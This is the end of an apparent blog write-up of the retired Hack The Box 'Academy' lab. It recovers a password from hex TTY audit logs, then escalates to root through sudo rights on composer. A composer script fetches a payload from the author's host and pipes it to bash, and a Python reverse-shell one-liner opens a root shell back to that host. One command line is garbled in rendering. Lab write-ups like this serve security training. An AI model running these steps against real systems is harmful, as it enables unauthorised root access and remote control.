<span class="nb">type</span><span class="o">=</span>TTY <span class="nv">msg</span><span class="o">=</span>audit<span class="o">(</span>1597199533.458:95<span class="o">)</span>: <span class="nb">tty </span><span class="nv">pid</span><span class="o">=</span>2643 <span class="nv">uid</span><span class="o">=</span>1002 <span class="nv">auid</span><span class="o">=</span>0 <span class="nv">ses</span><span class="o">=</span>1 <span class="nv">major</span><span class="o">=</span>4 <span class="nv">minor</span><span class="o">=</span>1 <span class="nb">comm</span><span class="o">=</span><span class="s2">"nano"</span> <span class="nv">data</span><span class="o">=</span>1B5B421B5B411B5B411B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B427F1B5B421B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E18790D
<span class="nb">type</span><span class="o">=</span>TTY <span class="nv">msg</span><span class="o">=</span>audit<span class="o">(</span>1597199575.087:96<span class="o">)</span>: <span class="nb">tty </span><span class="nv">pid</span><span class="o">=</span>2686 <span class="nv">uid</span><span class="o">=</span>1002 <span class="nv">auid</span><span class="o">=</span>0 <span class="nv">ses</span><span class="o">=</span>1 <span class="nv">major</span><span class="o">=</span>4 <span class="nv">minor</span><span class="o">=</span>1 <span class="nb">comm</span><span class="o">=</span><span class="s2">"nano"</span> <span class="nv">data</span><span class="o">=</span>3618790D
<span class="nb">type</span><span class="o">=</span>TTY <span class="nv">msg</span><span class="o">=</span>audit<span class="o">(</span>1597199606.563:97<span class="o">)</span>: <span class="nb">tty </span><span class="nv">pid</span><span class="o">=</span>2537 <span class="nv">uid</span><span class="o">=</span>1002 <span class="nv">auid</span><span class="o">=</span>0 <span class="nv">ses</span><span class="o">=</span>1 <span class="nv">major</span><span class="o">=</span>4 <span class="nv">minor</span><span class="o">=</span>1 <span class="nb">comm</span><span class="o">=</span><span class="s2">"bash"</span> <span class="nv">data</span><span class="o">=</span>63611B5B411B5B411B5B417F7F636174206175097C206772657020646174613D0D636174206175097C20637574202D663131202D642220220D1B5B411B5B441B5B441B5B441B5B441B5B441B5B441B5B441B5B441B5B441B5B441B5B441B5B441B5B441B5B441B5B441B5B441B5B431B5B436772657020646174613D207C200D1B5B41203E202F746D702F646174612E7478740D69640D6364202F746D700D6C730D6E616E6F2064090D636174206409207C207878092D72202D700D6D617F7F7F6E616E6F2064090D6361742064617409207C20787864202D7220700D1B5B411B5B442D0D636174202F7661722F6C6F672F61750974097F7F7F7F7F7F6409617564097C206772657020646174613D0D1B5B411B5B411B5B411B5B411B5B411B5B420D1B5B411B5B411B5B410D1B5B411B5B411B5B410D657869747F7F7F7F686973746F72790D657869740D
<span class="nb">type</span><span class="o">=</span>TTY <span class="nv">msg</span><span class="o">=</span>audit<span class="o">(</span>1597199606.567:98<span class="o">)</span>: <span class="nb">tty </span><span class="nv">pid</span><span class="o">=</span>2517 <span class="nv">uid</span><span class="o">=</span>1002 <span class="nv">auid</span><span class="o">=</span>0 <span class="nv">ses</span><span class="o">=</span>1 <span class="nv">major</span><span class="o">=</span>4 <span class="nv">minor</span><span class="o">=</span>1 <span class="nb">comm</span><span class="o">=</span><span class="s2">"sh"</span> <span class="nv">data</span><span class="o">=</span>657869740A
<span class="nb">type</span><span class="o">=</span>TTY <span class="nv">msg</span><span class="o">=</span>audit<span class="o">(</span>1597199610.163:107<span class="o">)</span>: <span class="nb">tty </span><span class="nv">pid</span><span class="o">=</span>2709 <span class="nv">uid</span><span class="o">=</span>1002 <span class="nv">auid</span><span class="o">=</span>0 <span class="nv">ses</span><span class="o">=</span>1 <span class="nv">major</span><span class="o">=</span>4 <span class="nv">minor</span><span class="o">=</span>1 <span class="nb">comm</span><span class="o">=</span><span class="s2">"sh"</span> <span class="nv">data</span><span class="o">=</span>2F62696E2F62617368202D690A
<span class="nb">type</span><span class="o">=</span>TTY <span class="nv">msg</span><span class="o">=</span>audit<span class="o">(</span>1597199616.307:108<span class="o">)</span>: <span class="nb">tty </span><span class="nv">pid</span><span class="o">=</span>2712 <span class="nv">uid</span><span class="o">=</span>1002 <span class="nv">auid</span><span class="o">=</span>0 <span class="nv">ses</span><span class="o">=</span>1 <span class="nv">major</span><span class="o">=</span>4 <span class="nv">minor</span><span class="o">=</span>1 <span class="nb">comm</span><span class="o">=</span><span class="s2">"bash"</span> <span class="nv">data</span><span class="o">=</span>6973746F72790D686973746F72790D657869740D
<span class="nb">type</span><span class="o">=</span>TTY <span class="nv">msg</span><span class="o">=</span>audit<span class="o">(</span>1597199616.307:109<span class="o">)</span>: <span class="nb">tty </span><span class="nv">pid</span><span class="o">=</span>2709 <span class="nv">uid</span><span class="o">=</span>1002 <span class="nv">auid</span><span class="o">=</span>0 <span class="nv">ses</span><span class="o">=</span>1 <span class="nv">major</span><span class="o">=</span>4 <span class="nv">minor</span><span class="o">=</span>1 <span class="nb">comm</span><span class="o">=</span><span class="s2">"sh"</span> <span class="nv">data</span><span class="o">=</span>657869740A
</pre></table></code></div></div><p>The data is in <code class="language-plaintext highlighter-rouge">hex</code> so i try converting it to <code class="language-plaintext highlighter-rouge">ASCII</code></p><p>of the line</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nb">type</span><span class="o">=</span>TTY <span class="nv">msg</span><span class="o">=</span>audit<span class="o">(</span>1597199293.906:84<span class="o">)</span>: <span class="nb">tty </span><span class="nv">pid</span><span class="o">=</span>2520 <span class="nv">uid</span><span class="o">=</span>1002 <span class="nv">auid</span><span class="o">=</span>0 <span class="nv">ses</span><span class="o">=</span>1 <span class="nv">major</span><span class="o">=</span>4 <span class="nv">minor</span><span class="o">=</span>1 <span class="nb">comm</span><span class="o">=</span><span class="s2">"su"</span> <span class="nv">data</span><span class="o">=</span>6D7262336E5F41634064336D79210A
</pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>root at Mohammadaassif <span class="k">in</span> /home/prashant 
<span class="nv">$ </span>python
Python 2.7.18 <span class="o">(</span>default, Apr 20 2020, 20:30:41<span class="o">)</span> 
<span class="o">[</span>GCC 9.3.0] on linux2
Type <span class="s2">"help"</span>, <span class="s2">"copyright"</span>, <span class="s2">"credits"</span> or <span class="s2">"license"</span> <span class="k">for </span>more information.
<span class="o">&gt;&gt;&gt;</span> <span class="s2">"6D7262336E5F41634064336D79210A"</span>.decode<span class="o">(</span><span class="s1">'hex'</span><span class="o">)</span>
<span class="s1">'mrb3n_Ac@d3my!\n'</span>
<span class="o">&gt;&gt;&gt;</span>
</pre></table></code></div></div><p>SO i got a readable string <code class="language-plaintext highlighter-rouge">mrb3n_Ac@d3my!</code> thats seems to be a password of <code class="language-plaintext highlighter-rouge">mrb3n</code></p><h1 id="login-as-mrb3n">Login as mrb3n</h1><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>cry0l1t3@academy:/var/log/audit<span class="nv">$ </span>su - mrb3n
Password: 
<span class="nv">$ </span><span class="nb">whoami
</span>mrb3n
</pre></table></code></div></div><p>So i am mrb3n now</p><h1 id="privilege-escalation-to-root">Privilege Escalation to root</h1><p>So first thing i tried <code class="language-plaintext highlighter-rouge">sudo -l</code> to check what privs i have as root</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>mrb3n@academy:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>mrb3n: 
Matching Defaults entries <span class="k">for </span>mrb3n on academy:
    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
User mrb3n may run the following commands on academy:
    <span class="o">(</span>ALL<span class="o">)</span> /usr/bin/composer
mrb3n@academy:~<span class="err">$</span>
</pre></table></code></div></div><p>So i can run <code class="language-plaintext highlighter-rouge">composer</code> as root</p><p>So i can run custom scripts with <code class="language-plaintext highlighter-rouge">composer</code> since i have permissions to run it as root i will get shell as root</p><h2 id="running-scripts-with-composer">Running scripts with composer</h2><blockquote><p><a href="https://getcomposer.org/doc/articles/scripts.md" target="_blank">https://getcomposer.org/doc/articles/scripts.md</a></p></blockquote><p>i need to specify the scripts in the <code class="language-plaintext highlighter-rouge">composer.josn</code> file</p><blockquote><p>syntax</p></blockquote><div class="language-json highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="nl">"scripts"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="nl">"cmd"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
            </span><span class="s2">"Command i want to run"</span><span class="w">
        </span><span class="p">]</span><span class="w">
    </span><span class="p">}</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></pre></table></code></div></div><p>so my final scripts will look like this</p><div class="language-json highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="nl">"scripts"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="nl">"cmd"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
            </span><span class="s2">"ctarget="</span><span class="err">_blank</span><span class="s2">" 10.10.14.78/shell.sh | bash"</span><span class="w">
        </span><span class="p">]</span><span class="w">
    </span><span class="p">}</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></pre></table></code></div></div><p>and i started the <code class="language-plaintext highlighter-rouge">python</code> server on my machine</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>root at Mohammadaassif <span class="k">in</span> /home/prashant 
<span class="nv">$ </span>python <span class="nt">-m</span> SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
</pre></table></code></div></div><p>the <code class="language-plaintext highlighter-rouge">shell.sh</code> file has the following content</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">python3</span> <span class="o">-</span><span class="n">c</span> <span class="s">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.78",2345));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'</span>
</pre></table></code></div></div><p>and i can run the script with the following <code class="language-plaintext highlighter-rouge">command</code></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nb">sudo </span>composer cmd
</pre></table></code></div></div><p>and as soon as i run the above command i got the shell as root</p><p><a href="../hackthebox/academy/1ef5cc3d-cd70-41d3-8ef1-bea1da61c7c1/11.png"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="../hackthebox/academy/1ef5cc3d-cd70-41d3-8ef1-bea1da61c7c1/11.png" alt="" /></a></p><h1 id="got-roottxt">Got root.txt</h1><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>root@academy:~# <span class="nb">cat </span>root.txt
<span class="nb">cat </span>root.txt
29a4ab3f2b81dbdb98ec227f86ef9525
</pre></table></code></div></div><p>And we pwned it .</p><p>If u liked the writeup.Support a Poor Student to Get the <code class="language-plaintext highlighter-rouge">OSCP-Cert</code> on <a href="https://www.buymeacoffee.com/Mohammadaassif" target="_blank">BuymeaCoffee</a></p><blockquote><p>If you want to get notified as soon as i upload something new to my <code class="language-plaintext highlighter-rouge">blog</code> So just click on the bell icon you are seeing on the right side  &gt; and allow push</p></blockquote><h1 id="resources">Resources</h1><div class="table-wrapper"><table><thead><tr><th>Topic<th>Details<tbody><tr><td>Composer Scripts<td><a href="https://getcomposer.org/doc/articles/scripts.md" target="_blank">https://getcomposer.org/doc/articles/scripts.md</a><tr><td>adm group<td><a href="https://serverfault.com/questions/485473/what-is-the-canonical-use-for-the-sys-and-adm-groups" target="_blank">https://serverfault.com/questions/485473/what-is-the-canonical-use-for-the-sys-and-adm-groups</a></table></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='../categories/hackthebox.html'>Hackthebox</a>, <a href='../categories/retired.html'>retired</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="../tags/leravel.html" class="post-tag no-text-decoration" >Leravel</a> <a href="../tags/enumeration.html" class="post-tag no-text-decoration" >Enumeration</a> <a href="../tags/remote-code-execution.html" class="post-tag no-text-decoration" >Remote Code Execution</a> <a href="../tags/composer.html" class="post-tag no-text-decoration" >composer</a> <a href="../tags/privilege-escalation.html" class="post-tag no-text-decoration" >Privilege Escalation</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hackthebox Academy writeup - Mohammadaassif&url=https://Mohammadaassif.github.io/posts/htb-academy/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hackthebox Academy writeup - Mohammadaassif&u=https://Mohammadaassif.github.io/posts/htb-academy/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Hackthebox Academy writeup - Mohammadaassif&url=https://Mohammadaassif.github.io/posts/htb-academy/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="../tags/hackthebox.html">hackthebox</a> <a class="post-tag" href="../tags/john.html">john</a> <a class="post-tag" href="../tags/wfuzz.html">wfuzz</a> <a class="post-tag" href="../tags/cracking-id_rsa.html">cracking id_rsa</a> <a class="post-tag" href="../tags/docker.html">docker</a> <a class="post-tag" href="../tags/ftp.html">ftp</a> <a class="post-tag" href="../tags/ldap.html">ldap</a> <a class="post-tag" href="../tags/ldapsearch.html">ldapsearch</a> <a class="post-tag" href="../tags/lfi.html">lfi</a> <a class="post-tag" href="../tags/metasploit.html">metasploit</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="disqus" class="pt-2 pb-2"><p class="font-italic text-center text-muted small"> Comments powered by <a href="https://disqus.com/">Disqus</a>.</p></div><script src="../assets/js/lib/jquery.disqusloader.min.js"></script> <script> var options = { scriptUrl: '../embed.js', disqusConfig: function() { this.page.url = 'https://Mohammadaassif.github.io/posts/htb-academy/'; this.page.identifier = '/posts/htb-academy/'; } }; $.disqusLoader('#disqus', options); </script><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="../posts/htb-time.html"><div class="card-body"> <span class="timeago small" > Oct 25, 2020 <i class="unloaded">2020-10-25T00:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Time writeup</h3><div class="text-muted small"><p> Introduction@Time:~$ Column Details Name Time IP 10.10.10.214 Points 30 Os Linux ...</p></div></div></a></div><div class="card"> <a href="../posts/htb-fuse.html"><div class="card-body"> <span class="timeago small" > Jun 16, 2020 <i class="unloaded">2020-06-16T00:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Fuse writeup</h3><div class="text-muted small"><p> Introduction@Fuse:~$ Column Details Name Fuse IP 10.10.10.193 Points 30 Os Window...</p></div></div></a></div><div class="card"> <a href="../posts/htb-tabby.html"><div class="card-body"> <span class="timeago small" > Jun 23, 2020 <i class="unloaded">2020-06-23T00:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Tabby writeup</h3><div class="text-muted small"><p> Introduction@Tabby:~$ Column Details Name Tabby IP 10.10.10.194 Points 20 Os Linu...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="../posts/htb-time.html" class="btn btn-outline-primary"><p>Hackthebox Time writeup</p></a> <a href="../posts/htb-laboratory.html" class="btn btn-outline-primary"><p>Hackthebox Laboratory writeup</p></a></div></div></div></div><script type="text/javascript" src="../npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"> <br></br> <script src="../badge/84820.js"></script></p></div><p class="mb-0">  2021 <a href="https://www.facebook.com/prashant.saini.37201">Prashant Saini</a>. <script> (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){ (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o), m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m) })(window,document,'script','https://www.google-analytics.com/analytics.js','ga'); ga('create', 'UA-157514490-1', 'auto'); ga('send', 'pageview'); </script> <script data-name="BMC-Widget" src="../1.0.0/widget.prod.min.js" data-id="Mohammadaassif" data-description="Support me on Buy me a coffee!" data-message="Like The Blog? Support Me!" data-color="#5F7FFF" data-position="right" data-x_margin="18" data-y_margin="18"></script></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="../tags/hackthebox.html">hackthebox</a> <a class="post-tag" href="../tags/john.html">john</a> <a class="post-tag" href="../tags/wfuzz.html">wfuzz</a> <a class="post-tag" href="../tags/cracking-id_rsa.html">cracking id_rsa</a> <a class="post-tag" href="../tags/docker.html">docker</a> <a class="post-tag" href="../tags/ftp.html">ftp</a> <a class="post-tag" href="../tags/ldap.html">ldap</a> <a class="post-tag" href="../tags/ldapsearch.html">ldapsearch</a> <a class="post-tag" href="../tags/lfi.html">lfi</a> <a class="post-tag" href="../tags/metasploit.html">metasploit</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="../npm/simple-jekyll-search_1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '../assets/js/data/search.js', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://Mohammadaassif.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script> <script async src="https://www.googletagmanager.com/gtag/js?id=UA-157514490-1"></script> <script> window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'UA-157514490-1'); </script>
